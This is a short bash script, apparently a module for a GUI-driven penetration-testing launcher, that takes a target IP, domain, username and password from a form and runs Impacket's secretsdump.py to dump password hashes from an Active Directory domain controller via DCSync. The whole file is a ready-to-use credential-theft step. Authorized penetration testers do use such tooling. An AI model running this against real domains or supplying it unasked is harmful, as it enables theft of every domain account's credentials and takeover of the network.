#!/bin/bash

: '
Impacket: use secretsdump to dump hashes (DCSync)
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
IP_FIELD=$(form_item  "ip" "ip")
DOMAIN_FIELD=$(form_item  "domain" "domain")
USERNAME_FIELD=$(form_item  "username" "username")
PASSWORD_FIELD=$(form_item  "password" "password")

# Generate GUI form
generate_form "${IP_FIELD}" "${DOMAIN_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}"

DOMAIN=${form_data["domain"]}
USERNAME=${form_data["username"]}
PASSWORD=${form_data["password"]}
IP=${form_data["ip"]}

execute_command "secretsdump.py ${DOMAIN}/${USERNAME}:${PASSWORD}@${IP}"
create_new_line
